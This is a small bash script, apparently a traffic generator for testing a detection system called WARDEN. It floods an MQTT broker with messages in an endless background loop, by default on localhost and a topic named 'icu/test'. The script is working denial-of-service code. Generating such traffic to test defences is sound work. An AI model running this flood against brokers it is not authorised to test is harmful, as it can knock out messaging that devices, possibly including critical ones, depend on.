#!/usr/bin/env bash
set -euo pipefail

HOST="${1:-localhost}"
TOPIC="${2:-icu/test}"
DELAY="${3:-0.01}"
MESSAGE="${4:-WARDEN_MQTT_SUSTAINED_ATTACK}"

echo "[WARDEN] Sustained MQTT flood"
echo "Host: $HOST"
echo "Topic: $TOPIC"
echo "Delay: $DELAY seconds"
echo "Press Ctrl+C to stop."

if ! command -v mosquitto_pub >/dev/null 2>&1; then
  echo "Error: mosquitto_pub not found."
  echo "Install with: sudo apt install mosquitto-clients"
  exit 1
fi

i=0
while true; do
  i=$((i + 1))
  mosquitto_pub -h "$HOST" -t "$TOPIC" -m "$MESSAGE-$i" >/dev/null 2>&1 &
  sleep "$DELAY"
done
